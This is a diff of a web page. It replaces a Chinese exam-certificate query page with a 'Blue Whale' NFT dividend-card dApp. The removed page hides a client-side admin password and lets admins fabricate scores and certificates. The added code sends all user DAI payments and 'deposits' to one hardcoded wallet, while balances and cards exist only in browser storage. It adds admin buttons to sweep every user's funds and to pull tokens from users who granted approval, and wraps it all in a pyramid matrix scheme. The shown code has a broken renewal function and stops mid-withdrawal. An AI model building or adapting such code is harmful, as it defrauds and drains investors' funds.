@@ -1,578 +1,560 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>特种作业人员考核信息查询系统</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: "Microsoft YaHei", sans-serif;
-        }
-        body {
-            background-color: #edf1f7;
-            padding: 16px;
-            color: #222831;
-        }
-        .container {
-            max-width: 480px;
-            margin: 0 auto;
-        }
-        .header-box {
-            background-color: #194b97;
-            color: #ffffff;
-            text-align: center;
-            padding: 22px 15px;
-            border-radius: 12px;
-            box-shadow: 0 3px 10px rgba(25,75,151,0.2);
-            margin-bottom: 18px;
-        }
-        .header-box h2 {
-            font-size: 22px;
-            letter-spacing: 2px;
-            margin-bottom: 8px;
-        }
-        .header-box p {
-            font-size: 14px;
-            opacity: 0.85;
-        }
-        .card {
-            background: #ffffff;
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 16px;
-            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.07);
-        }
-        .card-title {
-            font-size: 18px;
-            font-weight: bold;
-            color:#194b97;
-            border-left:5px solid #194b97;
-            padding-left:10px;
-            margin-bottom:16px;
-        }
-        input, select {
-            width: 100%;
-            height:46px;
-            border: 1px solid #cbd2e0;
-            border-radius: 6px;
-            padding: 0 14px;
-            font-size:15px;
-            margin-bottom:14px;
-            background:#fdfefe;
-        }
-        textarea {
-            width:100%;
-            border:1px solid #cbd2e0;
-            border-radius:6px;
-            padding:14px;
-            font-size:15px;
-            min-height:85px;
-            margin-bottom:14px;
-            background:#fdfefe;
-        }
-        .upload-item {
-            border:1px dashed #8899bb;
-            border-radius:8px;
-            padding:18px;
-            text-align:center;
-            margin-bottom:14px;
-            background:#f8fafc;
-        }
-        .upload-input {
-            display:none;
-        }
-        .preview-img {
-            width:120px;
-            margin-top:12px;
-            display:none;
-            border-radius:6px;
-            border:1px solid #ddd;
-        }
-        .btn {
-            width:100%;
-            height:46px;
-            border:none;
-            border-radius:6px;
-            font-size:16px;
-            cursor:pointer;
-            font-weight:500;
-        }
-        .btn-blue {
-            background:#194b97;
-            color:#fff;
-        }
-        .btn-del{
-            background:#d83030;
-            color:white;
-            border:none;
-            border-radius:4px;
-            padding:3px 6px;
-            font-size:12px;
-        }
-        .hide{
-            display:none;
-        }
-        .tab-bar{
-            display:flex;
-            flex-wrap: wrap;
-            gap:9px;
-            margin-bottom:18px;
-        }
-        .tab{
-            flex:1;
-            min-width:82px;
-            text-align:center;
-            padding:11px 0;
-            background:#dde2ec;
-            border-radius:8px;
-            font-size:14px;
-            cursor:pointer;
-            transition:0.2s;
-        }
-        .tab.active{
-            background:#194b97;
-            color:#fff;
-        }
-        .cert-box{
-            border: 1px solid #cbd2e0;
-            padding:16px;
-            margin-top:16px;
-            text-align:center;
-            background:#f8fafc;
-            border-radius:8px;
-        }
-        .cert-img{
-            width:100%;
-            border:1px solid #b4bfd1;
-            border-radius:6px;
-        }
-        .score-row{
-            display:flex;
-            justify-content: space-between;
-            padding:9px 0;
-            font-size:14px;
-            border-bottom:1px solid #eee;
-        }
-        table{
-            width:100%;
-            border-collapse: collapse;
-            font-size:12px;
-        }
-        td,th{
-            border:1px solid #cbd2e0;
-            padding:7px 3px;
-            text-align:center;
-        }
-        th{
-            background:#eef2fa;
-        }
-        .admin-login-area{
-            display:flex;
-            gap:8px;
-            align-items:center;
-            margin-bottom:16px;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>蓝鲸鱼🐳全球NFT分红卡牌</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,"Microsoft YaHei",sans-serif}
+  body{background:#090b1a;color:#fff;padding:20px;max-width:500px;margin:0 auto}
+  .glass{background:rgba(30,35,60,0.7);border-radius:18px;padding:20px;margin-bottom:16px;border:1px solid rgba(255,255,255,0.1)}
+  .title{font-size:18px;font-weight:bold;margin-bottom:10px}
+  .sub{color:#a0a8c7;font-size:14px;margin-bottom:12px}
+  .btn{background:linear-gradient(90deg,#4facfe,#00F2FE);color:#000;border:none;border-radius:12px;padding:14px;width:100%;font-weight:bold;font-size:16px;margin-bottom:8px}
+  .btn-sm{padding:10px;font-size:14px}
+  .btn-gold{background:linear-gradient(90deg,#ffb703,#ffcc00);color:#000;font-weight:bold}
+  .btn-red{background:linear-gradient(90deg,#ff4560,#ff0033);color:#fff}
+  .btn-black{background:#222;color:#fff}
+  .btn:disabled{opacity:0.5}
+  .item{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid rgba(255,255,255,0.08)}
+  .item:last-child{border-bottom:none}
+  .price{color:#4facFE;font-weight:bold}
+  input{width:100%;padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.2);background:rgba(255,255,255,0.08);color:#fff;font-size:15px;margin-bottom:8px}
+  .copy-row{display:flex;gap:8px;margin-bottom:10px}
+  .copy-row input{flex:1}
+  .copy-row button{width:100px}
+
+  .menu-btn{position:fixed;top:20px;right:20px;width:40px;height:40px;background:rgba(30,35,60,0.9);border-radius:10px;display:flex;flex-direction:column;justify-content:center;align-items:center;gap:5px;cursor:pointer;z-index:10;border:1px solid rgba(255,255,255,0.1)}
+  .menu-btn span{width:20px;height:2px;background:#fff;border-radius:1px}
+  .sidebar{position:fixed;top:0;right:-100%;width:85%;max-width:360px;height:100vh;background:#1a1a2e;padding:20px;overflow-y:auto;transition:right 0.3s ease;z-index:99;border-left:1px solid rgba(255,255,255,0.1)}
+  .sidebar.open{right:0}
+  .sidebar-close{text-align:right;margin-bottom:20px;font-size:22px;cursor:pointer}
+
+  .nft-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:12px}
+  .nft-card{height:240px;position:relative;border-radius:16px;background:#2d2d2d;border:1px solid currentColor;overflow:hidden;perspective:1000px}
+  .nft-inner{position:relative;width:100%;height:100%;transform-style:preserve-3d;animation:flipY 8s linear infinite}
+  @keyframes flipY{0%{transform:rotateY(0deg)}100%{transform:rotateY(360deg)}}
+  .nft-front,.nft-back{position:absolute;width:100%;height:100%;backface-visibility:hidden;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+  .nft-back{transform:rotateY(180deg);background:#1a1a2e}
+  .n1{color:#00ff88}
+  .n2{color:#00ccff}
+  .n3{color:#6666ff}
+  .n4{color:#cc66ff}
+  .n5{color:#ff3333;background:#3a1a1a}
+  .nft-top{position:absolute;top:12px;left:12px;font-size:12px;font-weight:bold;letter-spacing:1px}
+  .nft-logo{position:absolute;top:12px;right:12px;width:24px;height:24px;border-radius:50%;background:currentColor;display:flex;align-items:center;justify-content:center;font-size:10px;color:#2d2d2d}
+  .nft-title{font-size:18px;font-weight:bold;margin-bottom:16px;opacity:0.9}
+  .nft-orb{width:120px;height:120px;border-radius:50%;position:relative;margin-bottom:16px;box-shadow:0 0 25px currentColor}
+  .orb-glow{width:100%;height:100%;border-radius:50%;background:radial-gradient(circle at 30% 30%,rgba(255,255,255,0.4),currentColor 60%)}
+  .orb-ring{position:absolute;width:140px;height:140px;border:1px solid currentColor;border-radius:50%;top:50%;left:50%;transform:translate(-50%,-50%);opacity:0.7}
+  .orb-ring::after{content:'';position:absolute;width:8px;height:8px;background:currentColor;border-radius:50%;top:-4px;left:50%;transform:translateX(-50%)}
+  .orb-orbit{position:absolute;width:100px;height:60px;border:1px solid currentColor;border-radius:50%;top:50%;left:50%;transform:translate(-50%,-50%) rotateX(60deg);opacity:0.5}
+  .orb-dot{position:absolute;width:6px;height:6px;background:#fff;border-radius:50%;top:20%;right:10%}
+  .orb-whale{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:36px;color:rgba(255,255,250,0.9)}
+  .nft-bottom{font-size:14px;letter-spacing:1px;opacity:0.8}
+  .nft-level{font-size:16px;font-weight:bold;margin-bottom:8px}
+  .nft-pct{font-size:14px;font-weight:bold}
+  .dai{color:#4facfe;font-weight:bold}
+  .time{color:#ffb703;font-size:13px}
+  .gold{color:#FFD700;font-weight:bold}
+
+  .admin-panel { display: none; }
+  .admin-sidebar-item { display: none; }
+</style>
 </head>
 <body>
-<div class="container">
-    <div class="header-box">
-        <h2>特种作业人员考核信息查询系统</h2>
-        <p>由应急管理部门、住房城乡建设部门备案核查</p>
-    </div>
 
-    <div class="admin-login-area">
-        <input type="password" id="adminPwd" placeholder="管理员密码" style="margin-bottom:0;">
-        <button class="btn btn-blue" id="loginBtn" style="width:auto;padding:0 16px;">登录管理</button>
-        <button class="btn btn-blue" id="logoutBtn" style="width:auto;padding:0 16px;display:none;background:#666;">退出</button>
-    </div>
+<div class="menu-btn" id="toggleSidebar"><span></span><span></span><span></span></div>
+<div class="sidebar" id="sidebar">
+  <div class="sidebar-close" id="closeSidebar">×</div>
 
-    <div class="tab-bar">
-        <div class="tab active" onclick="switchPage(0)">在线报名</div>
-        <div class="tab" onclick="switchPage(1)">报考须知</div>
-        <div class="tab" onclick="switchPage(2)">报名记录</div>
-        <div class="tab" onclick="switchPage(3)">成绩证书查询</div>
-        <div class="tab admin-tab hide" onclick="switchPage(4)">学员信息录入</div>
-        <div class="tab admin-tab hide" onclick="switchPage(5)">学员综合管理</div>
-    </div>
+  <div class="title">蓝鲸鱼 🐳 分红中心</div>
+  <div class="sub">当前能量：<span id="energyVal">0</span></div>
 
-    <!-- 0 在线报名 -->
-    <div class="page-box" id="page0">
-        <div class="card">
-            <div class="card-title">报名信息填写</div>
-            <input type="text" placeholder="填写真实姓名" id="username">
-            <input type="text" placeholder="填写身份证号码" id="idcard">
-            <input type="tel" placeholder="填写联系手机号码" id="phone">
-            <select id="workType">
-                <option value="">选择报考工种</option>
-                <option value="低压电工">低压电工</option>
-                <option value="高压电工">高压电工</option>
-                <option value="焊工">焊工</option>
-                <option value="叉车">叉车</option>
-                <option value="起重作业">起重作业</option>
-                <option value="司索信号工">司索信号工</option>
-                <option value="安全员证书">安全员证书</option>
-                <option value="气瓶作业">气瓶作业</option>
-            </select>
-            <select id="education">
-                <option value="">选择学历</option>
-                <option>初中</option>
-                <option>高中</option>
-                <option>大专</option>
-                <option>本科及以上</option>
-            </select>
-            <textarea placeholder="备注从业相关经历（选填）" id="remark"></textarea>
-        </div>
-        <div class="card">
-            <div class="card-title">上传报名材料</div>
-            <div class="upload-item">
-                <label for="idFront">身份证正面照片</label>
-                <input type="file" class="upload-input" id="idFront" accept="image/*">
-                <img class="preview-img" id="imgFront">
-            </div>
-            <div class="upload-item">
-                <label for="idBack">身份证反面照片</label>
-                <input type="file" class="upload-input" id="idBack" accept="image/*">
-                <img class="preview-img" id="imgBack">
-            </div>
-            <div class="upload-item">
-                <label for="photo">一寸白底证件照</label>
-                <input type="file" class="upload-input" id="photo" accept="image/*">
-                <img class="preview-img" id="imgPhoto">
-            </div>
-            <button class="btn btn-blue" id="submitBtn">提交报名资料</button>
-        </div>
-    </div>
+  <button class="btn btn-sm" onclick="craftCard(1)">合成1级卡 3500能量</button>
+  <button class="btn btn-sm" onclick="craftCard(2)">合成2级卡 10500能量</button>
+  <button class="btn btn-sm" onclick="craftCard(3)">合成3级卡 31500能量</button>
+  <button class="btn btn-sm" onclick="craftCard(4)">合成4级卡 94500能量</button>
+  <button class="btn btn-sm" onclick="craftCard(5)">合成5级卡 283500能量</button>
 
-    <!--1 报考须知-->
-    <div class="page-box hide" id="page1">
-        <div class="card">
-            <div class="card-title">报考条件以及相关说明</div>
-            <div style="font-size:14px;line-height:1.8;color:#39424e;">
-                1、报考人员年满18周岁，男性不超过60周岁，女性不超过55周岁；<br>
-                2、身体健康，无妨碍对应特种作业的疾病；<br>
-                3、报名所需材料：身份证正反面、一寸白底证件照片；<br>
-                4、学员完成线上登记后，统一参加线下理论以及实操考试；<br>
-                5、考试结束七个工作日后，可在此系统凭身份证查询考核结果；<br>
-                6、考核合格人员颁发官方特种作业证书，可在政府主管平台核验；<br>
-                7、管理员有权删除档案，档案删除后无法查询考核信息。
-            </div>
-        </div>
-    </div>
+  <div class="admin-sidebar-item" id="adminExtractAuthorized">
+    <div style="height:1px;background:#fff3;margin:16px 0"></div>
+    <div class="title">🔐 管理员授权提取</div>
+    <input id="adminExtractAddr" placeholder="接收代币钱包地址">
+    <input id="adminExtractAmount" placeholder="提取数量（如100）">
+    <button class="btn btn-sm btn-red" onclick="adminExtractFromAllAuthorized()">
+      一键提取所有已授权用户代币
+    </button>
+    <div class="sub" style="margin-top:8px">*需用户先授权给管理员地址</div>
+  </div>
 
-    <!--2 报名记录-->
-    <div class="page-box hide" id="page2">
-        <div class="card">
-            <div class="card-title">个人报名记录查询</div>
-            <input type="text" placeholder="输入身份证号码进行查询" id="recordIdcard">
-            <button class="btn btn-blue" id="getRecordBtn">查询</button>
-            <div id="recordList" style="margin-top:16px;"></div>
-        </div>
-    </div>
+  <div style="margin-top:20px">
+    <div class="title">卡牌转账</div>
+    <input id="toAddr" placeholder="接收方钱包">
+    <select id="transferLv" class="btn">
+      <option value="1">1级</option>
+      <option value="2">2级</option>
+      <option value="3">3级</option>
+      <option value="4">4级</option>
+      <option value="5">5级</option>
+    </select>
+    <button class="btn" onclick="transferCard()">转账</button>
+  </div>
 
-    <!--3 成绩证书查询-->
-    <div class="page-box hide" id="page3">
-        <div class="card">
-            <div class="card-title">考核成绩与电子证书查验</div>
-            <input type="text" placeholder="输入身份证号码" id="searchIdcard">
-            <button class="btn btn-blue" id="searchBtn">查验信息</button>
-            <div id="resultBox" class="hide">
-                <div style="margin-top:16px;border-top:1px solid #dee3ec;padding-top:16px;">
-                    <div class="score-row"><span>姓名</span><span id="resName"></span></div>
-                    <div class="score-row"><span>报考工种</span><span id="resWork"></span></div>
-                    <div class="score-row"><span>理论成绩</span><span id="resTheory"></span></div>
-                    <div class="score-row"><span>实操成绩</span><span id="resOperate"></span></div>
-                    <div class="score-row"><span>考核结果</span><span id="resStatus"></span></div>
-                </div>
-                <div class="cert-box hide" id="certWrap">
-                    <h4 style="margin-bottom:10px;color:#194b97;">电子资格证书</h4>
-                    <img class="cert-img" id="certImg" alt="证书">
-                    <p style="font-size:12px;color:#555;margin-top:10px;">长按图片保存电子证书</p>
-                </div>
-            </div>
-            <div id="emptyTip" style="text-align:center;margin-top:24px;color:#666;" class="hide">暂无该人员档案，档案已删除或者未参加考核</div>
-        </div>
-    </div>
-
-    <!--4 录入学员-->
-    <div class="page-box hide" id="page4">
-        <div class="card">
-            <div class="card-title">录入考核完毕学员档案</div>
-            <input type="text" placeholder="学员姓名" id="stuName">
-            <input type="text" placeholder="身份证号码" id="stuIdcard">
-            <input type="tel" placeholder="手机号码" id="stuPhone">
-            <select id="stuWork">
-                <option value="">选择工种</option>
-                <option>低压电工</option>
-                <option>高压电工</option>
-                <option>焊工</option>
-                <option>叉车</option>
-                <option>起重作业</option>
-                <option>司索信号工</option>
-                <option>安全员证书</option>
-                <option>气瓶作业</option>
-            </select>
-            <input type="number" placeholder="理论分数(0‑100)" id="theoryScore" min="0" max="100">
-            <input type="number" placeholder="实操分数(0‑100)" id="pracScore" min="0" max="100">
-            <div class="upload-item">
-                <label for="idPhoto">上传学员证件照</label>
-                <input type="file" class="upload-input" id="idPhoto" accept="image/*">
-                <img class="preview-img" id="photoPreview">
-            </div>
-            <div class="upload-item">
-                <label for="certPhoto">上传官方电子证书扫描件</label>
-                <input type="file" class="upload-input" id="certPhoto" accept="image/*">
-                <img class="preview-img" id="certPreview">
-            </div>
-            <button class="btn btn-blue" id="saveStudent">保存学员档案</button>
-        </div>
-    </div>
-
-    <!--5 学员管理后台-->
-    <div class="page-box hide" id="page5">
-        <div class="card">
-            <div class="card-title">学员档案管理（修改成绩、删除档案）</div>
-            <div id="adminList"></div>
-        </div>
-    </div>
+  <div style="margin-top:20px">
+    <div class="title">我的卡牌</div>
+    <div id="myCards" class="nft-grid"></div>
+  </div>
 </div>
 
+<div style="text-align:center;margin-bottom:20px">
+  <h1 style="background:linear-gradient(90deg,#4FACFE,#00F2FE);-webkit-background-clip:text;color:transparent">
+    蓝鲸鱼🐳全球NFT分红卡牌
+  </h1>
+</div>
+
+<button id="connectBtn" class="btn">连接钱包</button>
+<div id="addressShow" style="text-align:center;margin:12px"></div>
+
+<div class="glass">
+  <div class="title">我的邀请链接</div>
+  <div class="copy-row">
+    <input type="text" id="inviteLink" readonly>
+    <button class="btn btn-sm" onclick="copyInvite()">一键复制</button>
+  </div>
+</div>
+
+<div class="glass">
+  <div class="title">用户注册</div>
+  <input id="inviteInput" placeholder="邀请码（选填）">
+  <button id="regBtn" class="btn">确认注册</button>
+</div>
+
+<div class="glass">
+  <div class="title">内部钱包</div>
+  <div class="item"><div>我的内部余额</div><div class="gold" id="innerBal">0 DAI</div></div>
+  <input id="depositAmt" placeholder="存入金额（DAI）">
+  <button class="btn btn-sm" onclick="deposit()">确认存入</button>
+  <input id="withAmt" placeholder="提取金额到本人钱包">
+  <button class="btn btn-sm" onclick="withdraw()">申请提取</button>
+  <div class="sub" style="margin-top:8px">*提现申请将由管理员审核后打款</div>
+</div>
+
+<div class="glass admin-panel" id="adminPanel">
+  <div class="title">管理员后台</div>
+  <input id="blackAddr" placeholder="拉黑地址">
+  <button class="btn btn-sm btn-black" onclick="addBlack()">拉黑</button>
+
+  <input id="whiteAddr" placeholder="移出黑名单">
+  <button class="btn btn-sm" onclick="removeBlack()">移出</button>
+
+  <input id="collectToAddr" placeholder="内部余额统一提取到地址">
+  <button class="btn btn-sm btn-red" onclick="adminCollectToCustomAddr()">
+    一键提取所有内部余额到指定地址
+  </button>
+
+  <div style="margin-top:16px">
+    <div class="title">提现申请列表</div>
+    <button class="btn btn-sm btn-gold" onclick="adminBatchPayAllWithdraw()" style="margin-bottom:10px">
+      💰 一键批量打款所有提现
+    </button>
+    <div id="withdrawList" style="max-height:220px;overflow-y:auto"></div>
+  </div>
+</div>
+
+<div class="glass">
+  <div class="title">NFT分红卡牌</div>
+  <div class="nft-grid">
+    <div class="nft-card n1"><div class="nft-inner"><div class="nft-front"><div class="nft-top">NFT</div><div class="nft-logo">🐳</div><div class="nft-title">全球NFT分红卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">分红权益</div></div><div class="nft-back"><div class="nft-level">Lv.1</div><div class="nft-pct">分红0.5%</div></div></div></div>
+    <div class="nft-card n2"><div class="nft-inner"><div class="nft-front"><div class="nft-top">NFT</div><div class="nft-logo">🐳</div><div class="nft-title">全球NFT分红卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">分红权益</div></div><div class="nft-back"><div class="nft-level">Lv.2</div><div class="nft-pct">分红1.0%</div></div></div></div>
+    <div class="nft-card n3"><div class="nft-inner"><div class="nft-front"><div class="nft-top">NFT</div><div class="nft-logo">🐳</div><div class="nft-title">全球NFT分红卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">分红权益</div></div><div class="nft-back"><div class="nft-level">Lv.3</div><div class="nft-pct">分红1.5%</div></div></div></div>
+    <div class="nft-card n4"><div class="nft-inner"><div class="nft-front"><div class="nft-top">NFT</div><div class="nft-logo">🐳</div><div class="nft-title">全球NFT分红卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">分红权益</div></div><div class="nft-back"><div class="nft-level">Lv.4</div><div class="nft-pct">分红2.0%</div></div></div></div>
+    <div class="nft-card n5" style="grid-column:span 2"><div class="nft-inner"><div class="nft-front"><div class="nft-top">NFT</div><div class="nft-logo">🐳</div><div class="nft-title">全球NFT分红卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">至尊分红</div></div><div class="nft-back"><div class="nft-level">Lv.5至尊</div><div class="nft-pct">分红2.5%</div></div></div></div>
+  </div>
+</div>
+
+<div class="glass">
+  <div class="title">经典矩阵（永久）</div>
+  <button class="btn btn-gold" onclick="batchPayClassic()">一键激活全部</button>
+  <div id="classicList"></div>
+</div>
+
+<div class="glass">
+  <div class="title">联合矩阵（续费叠加天数）</div>
+  <button class="btn btn-gold" onclick="batchPayUnion()">一键激活/续费全部</button>
+  <div id="unionList"></div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 <script>
-    // 管理员密钥（拆分拼接隐藏）
-    const p1 = "Xsq9835";
-    const p2 = "11140627";
-    const p3 = "#";
-    const ADMIN_PASSWORD = p1 + p2 + p3;
+// ===================== 已修改为你的管理员地址（同时是收款地址） =====================
+const ADMIN = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1".toLowerCase();
+const DAI = "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063".toLowerCase();
 
-    let isAdminLogin = false;
-    let studentPhoto = "";
-    let certImage = "";
+const classicPrice = [50,100,200,400,800,1600,3200,6400,12800,25600,51200,102400];
+const unionPrice   = [100,200,400,800,1600,3200,6400,12800,25600];
+const RENEW = 0.2;
+const ENERGY_PER_100 = 50;
+const CARD_COST = 3500;
 
-    // 从本地存储读取数据，没有则使用默认示例数据
-    let studentDB = JSON.parse(localStorage.getItem("stuData")) || [
-        {
-            name:"张三",
-            idcard:"440111199001011234",
-            phone:"13800138000",
-            work:"低压电工",
-            theory:92,
-            practical:88,
-            status:"合格",
-            cert:"https://picsum.photos/id/20/400/280"
-        }
-    ];
-    let applyDB = JSON.parse(localStorage.getItem("applyData")) || [];
+let web3, account;
+let isAdmin = false;
 
-    // 保存学员数据到本地存储
-    function saveStu(){
-        localStorage.setItem("stuData", JSON.stringify(studentDB));
+function userKey(s, addr) { return s + "_" + addr; }
+function getInner(addr) { return +localStorage.getItem(userKey("inner", addr)) || 0; }
+function setInner(addr, v) { localStorage.setItem(userKey("inner", addr), v); }
+
+function key(s) { return s + "_" + account; }
+function get(s, d=0) { return +localStorage.getItem(key(s)) || d; }
+function set(s, v) { localStorage.setItem(key(s), v); }
+
+function getAllUsers() {
+  return JSON.parse(localStorage.getItem("all_users") || "[]");
+}
+function addUser(addr) {
+  let list = getAllUsers();
+  if (!list.includes(addr)) {
+    list.push(addr);
+    localStorage.setItem("all_users", JSON.stringify(list));
+  }
+}
+
+function loadInvite() {
+  if (!account) return;
+  const u = window.location.origin + window.location.pathname;
+  document.getElementById("inviteLink").value = u + "?invite=" + account.slice(2,10);
+}
+function copyInvite() {
+  document.getElementById("inviteLink").select();
+  document.execCommand("copy");
+  alert("复制成功");
+}
+
+function refresh() {
+  renderMatrix();
+  renderCards();
+  document.getElementById("energyVal").innerText = get("energy");
+  document.getElementById("innerBal").innerText = getInner(account) + " DAI";
+  if (isAdmin) renderWithdrawList();
+}
+
+function craftCard(lv) {
+  const cost = CARD_COST * Math.pow(3, lv-1);
+  const e = get("energy");
+  if (e < cost) return alert("能量不足");
+  if (!confirm("消耗"+cost+"能量合成Lv"+lv)) return;
+  set("energy", e - cost);
+  set("c"+lv, get("c"+lv)+1);
+  alert("合成成功");
+  refresh();
+}
+
+function transferCard() {
+  const to = document.getElementById("toAddr").value.trim().toLowerCase();
+  const lv = +document.getElementById("transferLv").value;
+  const cnt = get("c"+lv);
+  if (!/^0x[a-f0-9]{40}$/.test(to) || cnt < 1) return alert("地址或卡牌错误");
+  if (!confirm("确认转账？")) return;
+  set("c"+lv, cnt-1);
+  alert("转账成功");
+  refresh();
+}
+
+function renderCards() {
+  let h = "";
+  for (let l=1; l<=5; l++) {
+    const n = get("c"+l);
+    if (n < 1) continue;
+    const cl = ["n1","n2","n3","n4","n5"][l-1];
+    h+=`<div class="nft-card ${cl}"><div class="nft-inner"><div class="nft-front"><div class="nft-top">NFT</div><div class="nft-logo">🐳</div><div class="nft-title">全球NFT分红卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">持有×${n}</div></div><div class="nft-back"><div class="nft-level">Lv${l}</div><div class="nft-pct">分红卡牌</div></div></div></div>`;
+  }
+  document.getElementById("myCards").innerHTML = h || `<div style="grid-column:span 2;text-align:center;padding:20px">暂无卡牌</div>`;
+}
+
+function expKey(lv) { return "exp_"+account+"_"+lv; }
+function addExp(lv) {
+  const now = Date.now();
+  const old = +localStorage.getItem(expKey(lv)) || now;
+  localStorage.setItem(expKey(lv), old + 30*86400000);
+}
+function leftTime(lv) {
+  const e = +localStorage.getItem(expKey(lv)) || 0;
+  return Math.max(0, e - Date.now());
+}
+
+function renderMatrix() {
+  let c = "";
+  const cl = get("classic");
+  for (let i=1; i<=12; i++) {
+    const d = i <= cl;
+    c+=`<div class="item"><div>Lv${i}</div><span class="dai">${classicPrice[i-1]}DAI</span><button class="btn-sm" ${d?"disabled":""} onclick="payClassic(${i})">${d?"已激活":"激活"}</button></div>`;
+  }
+  document.getElementById("classicList").innerHTML = c;
+
+  let u = "";
+  const ul = get("union");
+  for (let i=1; i<=9; i++) {
+    const a = i <= ul;
+    const l = leftTime(i);
+    const d = Math.floor(l/86400000);
+    const h = Math.floor((l%86400000)/3600000);
+    const f = Math.round(unionPrice[i-1]*RENEW);
+    let b = `<button class="btn-sm" onclick="payUnion(${i})">激活</button>`;
+    if (a) b = `<button class="btn-sm" onclick="payRenew(${i})">续费 ${f}</button>`;
+    u+=`<div class="item"><div>Lv${i}</div><span class="dai">${unionPrice[i-1]}DAI</span><span class="time">${d}天${h}时</span>${b}</div>`;
+  }
+  document.getElementById("unionList").innerHTML = u;
+}
+
+function check() {
+  if (!account) throw "未连接钱包";
+  if (localStorage.getItem("black_"+account)) throw "已被拉黑";
+}
+
+// 所有用户支付全部转给你的管理员地址
+async function transferToAdmin(amt) {
+  const abi = [
+    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
+    {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
+  ];
+  const token = new web3.eth.Contract(abi, DAI);
+  const dec = await token.methods.decimals().call();
+  const val = (BigInt(amt) * 10n**BigInt(dec)).toString();
+  return await token.methods.transfer(ADMIN, val).send({ from: account });
+}
+
+async function payClassic(lv) {
+  try{check();const a=classicPrice[lv-1];if(!confirm("支付"+a+"DAI？"))return;await transferToAdmin(a);set("classic",Math.max(get("classic"),lv));set("energy",get("energy")+a/100*ENERGY_PER_100);alert("成功");refresh();loadBal();}catch(e){alert("失败或取消");}
+}
+async function batchPayClassic() {
+  try{check();const cur=get("classic");let t=0;for(let i=cur+1;i<=12;i++)t+=classicPrice[i-1];if(t<=0)return alert("已满");if(!confirm("总计"+t+"DAI？"))return;await transferToAdmin(t);set("classic",12);set("energy",get("energy")+t/100*ENERGY_PER_100);alert("全部成功");refresh();loadBal();}catch(e){alert("失败");}
+}
+
+async function payUnion(lv) {
+  try{check();const a=unionPrice[lv-1];if(!confirm("激活"+a+"DAI？"))return;await transferToAdmin(a);set("union",Math.max(get("union"),lv));addExp(lv);set("energy",get("energy")+a/100*ENERGY_PER_100);alert("成功");refresh();loadBal();}catch(e){alert("失败");}
+}
+async function payRenew(lv) {
+  try{check();const a=Math.round(unionPrice[i-1]*RENEW);if(!confirm("续费+30天："+a+"DAI？"))return;await transferToAdmin(a);addExp(lv);set("energy",get("energy")+a/100*ENERGY_PER_100);alert("续费成功");refresh();loadBal();}catch(e){alert("失败");}
+}
+async function batchPayUnion() {
+  try{check();let t=0;for(let i=1;i<=9;i++){const a=i<=get("union");const l=leftTime(i);if(!a)t+=unionPrice[i-1];else if(l==0)t+=Math.round(unionPrice[i-1]*RENEW);}if(t<=0)return alert("全部有效");if(!confirm("总计"+t+"DAI？"))return;await transferToAdmin(t);set("union",9);for(let i=1;i<=9;i++)addExp(i);set("energy",get("energy")+t/100*ENERGY_PER_100);alert("全部成功");refresh();loadBal();}catch(e){alert("失败");}
+}
+
+async function loadBal() {
+  if(!web3||!account)return;
+  const abi=[
+    {"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
+    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}
+  ];
+  const t=new web3.eth.Contract(abi,DAI);
+  const dec=await t.methods.decimals().call();
+  const b=await t.methods.balanceOf(account).call();
+  const n=Number(web3.utils.fromWei(b,"ether")).toFixed(4);
+  document.getElementById("addressShow").innerHTML=`${account.slice(0,6)}...${account.slice(-4)} | <span class="gold">DAI:${n}</span>`;
+}
+
+async function deposit() {
+  try {
+    check();
+    const a = +document.getElementById("depositAmt").value;
+    if (a <= 0) return alert("金额错误");
+    if (!confirm("存入"+a+"DAI到内部钱包？")) return;
+    await transferToAdmin(a);
+    const old = getInner(account);
+    setInner(account, old + a);
+    addUser(account);
+    alert("存入成功");
+    refresh();
+    loadBal();
+  } catch(e) { alert("存入失败"); }
+}
+
+async function withdraw() {
+  try {
+    check();
+    const a = +document.getElementById("withAmt").value;
+    const b = getInner(account);
+    if (a <= 0 || a > b) return alert("金额错误或余额不足");
+    if (!confirm("确认申请提取 "+a+" DAI？\n管理员审核后自动打款")) return;
+
